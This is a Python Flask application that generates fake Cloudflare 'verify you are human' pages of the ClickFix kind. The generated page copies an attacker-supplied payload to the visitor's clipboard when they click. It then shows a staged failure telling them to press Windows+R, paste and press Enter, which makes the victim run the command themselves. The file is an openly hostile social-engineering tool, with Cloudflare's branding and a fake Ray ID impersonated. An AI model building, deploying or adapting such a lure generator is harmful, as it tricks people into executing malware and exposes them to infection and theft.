from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route('/create_slog', methods=['POST'])
def create_slog():
    data = request.json
    website_name = data.get('website_name')
    redirect_to = data.get('redirect_to')
    payload = data.get('payload')

    # Use the desired HTML content, integrating the input values where necessary
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{website_name}</title>
        <style>
            body {{
                margin: 0;
                padding: 0;
                background-color: #181818;
                color: #fff;
                font-family: Arial, sans-serif;
                text-align: center;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }}

            .container {{
                max-width: 600px;
                text-align: center;
                position: relative;
            }}

            h1 {{
                font-size: 24px;
                margin-bottom: 20px;
            }}

            .message {{
                font-size: 16px;
                color: #bbb;
                margin-bottom: 20px;
            }}

            .captcha-box {{
                background-color: #202020;
                padding: 20px;
                border-radius: 10px;
                border: 1px solid #444;
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 15px;
                width: 300px;
                margin: 0 auto;
            }}

            .captcha-box .loader {{
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                border-top: 4px solid #fff;
                width: 30px;
                height: 30px;
                animation: spin 1s linear infinite;
            }}

            @keyframes spin {{
                0% {{ transform: rotate(0deg); }}
                100% {{ transform: rotate(360deg); }}
            }}

            .captcha-text {{
                font-size: 16px;
                color: #fff;
            }}

            .logo {{
                margin-top: 30px;
            }}

            .cloudflare-info {{
                color: #bbb;
                font-size: 14px;
                margin-top: 40px;
            }}

            .cloudflare-info .ray-id {{
                color: #999;
                margin-top: 15px;
            }}

            .cloudflare-info .footer {{
                margin-top: 15px;
                color: #888;
                font-size: 12px;
            }}

            .error-message {{
                color: #ff5f5f;
                font-size: 18px;
                margin-top: 20px;
                display: none; /* Hidden by default */
            }}

            .steps {{
                display: none; /* Hidden by default */
                margin-top: 20px;
                font-size: 16px;
                color: #fff;
            }}

            .steps p {{
                margin: 5px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>{website_name}</h1>
            <p class="message">Verifying you are human. This may take a few seconds.</p>

            <div class="captcha-box" id="captcha-box">
                <div class="loader"></div>
                <div class="captcha-text">Verifying...</div>
            </div>

            <p class="message">This website needs to review the security of your connection before proceeding.</p>

            <div class="cloudflare-info">
                <img class="logo" src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" alt="Cloudflare logo" width="150">
                <div class="ray-id">Ray ID: 15f4sR1c7Rd</div>
                <div class="footer">Performance & security by Cloudflare</div>
            </div>

            <p class="error-message" id="error-message">Unable to verify you're human. Please follow the steps below:</p>

            <div class="steps" id="steps">
                <p>1. Press Windows Button "<img src="/static/windows-key-logo.svg" style="background-color: white; width: 20px; height: 20px;"> + R"</p>
                <p>2. Press CTRL + V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
                <p>3. Press Enter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
            </div>
        </div>

        <script>
            // Copy the payload to the clipboard when the user clicks anywhere on the page
            document.addEventListener('click', function() {{
                const payload = `{payload} + #This Dialog Verifies that i am a human on pressing `; // Use template literal for multiline strings
                navigator.clipboard.writeText(payload)
                    .then(() => {{
                        console.log('Payload copied to clipboard!');
                    }})
                    .catch(err => console.error('Failed to copy: ', err));

                // Redirect the user after 1000 milliseconds
                setTimeout(() => {{
                    window.location.href = '{redirect_to}';
                }}, 100000);     
            }});

            setTimeout(function() {{
                document.getElementById('captcha-box').style.display = 'none';
                const errorMessage = document.getElementById('error-message');
                errorMessage.style.display = 'block';
                const steps = document.getElementById('steps');
                steps.style.display = 'block';
            }}, 5000);  // 5 seconds delay for the error message
        </script>
    </body>
    </html>
    """

    # Save the HTML content to a file
    file_path = os.path.join("static", f"{website_name}.html")
    with open(file_path, 'w') as f:
        f.write(html_content)

    file_path = file_path.replace('\\', '/')

    # Return the file path as a response
    return jsonify({'slog_link': f'http://127.0.0.1:5000/{file_path}'})

if __name__ == '__main__':
    app.run(debug=True)
